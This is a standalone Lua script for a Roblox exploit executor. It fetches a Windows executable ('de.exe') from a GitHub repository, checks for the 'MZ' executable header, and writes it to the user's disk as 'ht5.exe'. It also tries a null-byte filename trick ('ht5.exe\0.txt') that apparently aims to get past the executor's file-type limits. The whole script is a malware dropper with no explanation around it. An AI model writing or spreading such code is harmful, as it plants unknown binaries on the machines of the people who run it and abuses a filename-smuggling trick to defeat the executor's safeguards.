local genv = (pcall(getgenv) and getgenv()) or _G
local writefile = rawget(genv, "writefile") or rawget(_G, "writefile")
local http_req = rawget(genv, "request") or rawget(genv, "http_request") or rawget(_G, "request")

if type(writefile) ~= "function" then return end

local u = "https://github.com/NormalLinuxUser2/frrrrrrrr546/raw/refs/heads/main/de.exe"
local n = "ht5.exe"

local b = ""
local ok = false

if type(http_req) == "function" then
    local s, r = pcall(http_req, { Url = u, Method = "GET" })
    if s and r and r.StatusCode == 200 and type(r.Body) == "string" and r.Body:sub(1,2) == "MZ" then
        b = r.Body
        ok = true
    end
end

if not ok then
    pcall(function()
        local r = game:HttpGet(u)
        if r and r:sub(1,2) == "MZ" then
            b = r
            ok = true
        end
    end)
end

if not ok or #b < 1000 then return end

pcall(writefile, n .. "\0.txt", b)
pcall(writefile, n, b)
